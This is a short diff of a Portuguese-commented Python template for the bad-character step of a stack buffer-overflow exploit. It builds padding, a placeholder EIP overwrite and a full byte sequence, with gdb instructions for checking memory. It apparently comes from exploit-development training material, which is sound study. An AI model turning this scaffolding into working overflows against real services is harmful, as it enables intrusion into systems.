@@ -47,7 +47,7 @@ def bad_chars():
     # Converta a lista de inteiros em um objeto de bytes
     all_chars_bytes = bytes(all_chars)
     
-    offset = #coloque aqui o tamanho do EIP conseguido nas etapas anteriores - 256 (valor da lista) - 4 (local do eip)
+    offset = #coloque aqui o valor para chegar no EIP conseguido nas etapas anteriores - 256 (valor da lista) - 4 (local do eip)
     buffer = b"A" * offset
     eip = b"B" * 4
     payload = buffer + eip + all_chars_bytes  # Concatene bytes em vez de uma lista
@@ -60,7 +60,7 @@ def bad_chars():
 bad_chars()
 
 #após rodar o scrip no gdb verifique se os bytes segiram a sequencia corretamente
-#x/<valor do EIP> $esp+1000
 
+#x/<valor do EIP> $esp+1000
 
 #verifique se todos seguem a sequencia correta, caso não siga retire o byte que causou o erro e repita este passo
